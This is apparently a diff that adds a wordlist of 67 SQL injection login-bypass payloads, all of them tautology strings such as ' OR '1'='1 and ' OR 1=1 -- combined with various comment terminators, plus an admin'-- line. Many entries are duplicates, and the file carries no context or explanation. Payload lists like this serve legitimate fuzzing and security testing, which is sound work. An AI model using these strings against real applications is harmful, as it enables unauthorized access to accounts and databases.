@@ -1,0 +1,67 @@
+' OR '1'='1
+' OR '1'='1' --
+' OR '1'='1' #
+' OR '1'='1'/*
+' OR '1'='1' AND '1'='1
+' OR '1'='1' AND '1'='2
+' OR ''='
+' OR 'x'='x
+' OR 'x'='x' --
+' OR 'x'='x' #
+' OR 'x'='x'/*
+' OR 'x'='x' AND 'x'='x
+' OR 'x'='x' AND 'x'='y
+' OR 1=1
+' OR 1=1 --
+' OR 1=1 #
+' OR 1=1/*
+' OR 1=1 AND 1=1
+' OR 1=1 AND 1=2
+' OR 'a'='a
+' OR 'a'='a' --
+' OR 'a'='a' #
+' OR 'a'='a'/*
+' OR 'a'='a' AND 'a'='a
+' OR 'a'='a' AND 'a'='b
+' OR ''=''
+' OR 1=1-- 
+' OR '1'='1'-- 
+' OR 'text'='text'
+' OR 'x'='x'
+' OR '1'='1'/*'
+' OR 'a'='a'/*'
+' OR 'b'='b'
+' OR 'admin'='admin
+' OR 1=1 -- 
+' OR 1=1# 
+' OR 1=1/* 
+' OR 1=1 AND 1=1 
+' OR 1=1 AND 1=2 
+admin' OR '1'='1' 
+' OR 1=1-- 
+' OR 'a'='a
+admin'--
+' OR 1=1-- 
+' OR '1'='1' 
+' OR '1'='1' AND '1'='1' 
+' OR '1'='1' AND '1'='2'
+' OR ''=' 
+' OR 'x'='x' 
+' OR 'x'='x' -- 
+' OR 'x'='x' # 
+' OR 'x'='x'/* 
+' OR 'x'='x' AND 'x'='x' 
+' OR 'x'='x' AND 'x'='y' 
+' OR 1=1 
+' OR 1=1 -- 
+' OR 1=1 # 
+' OR 1=1/* 
+' OR 1=1 AND 1=1 
+' OR 1=1 AND 1=2 
+' OR 'a'='a 
+' OR 'a'='a' -- 
+' OR 'a'='a' # 
+' OR 'a'='a'/* 
+' OR 'a'='a' AND 'a'='a' 
+' OR 'a'='a' AND 'a'='b' 
+' OR ''=''
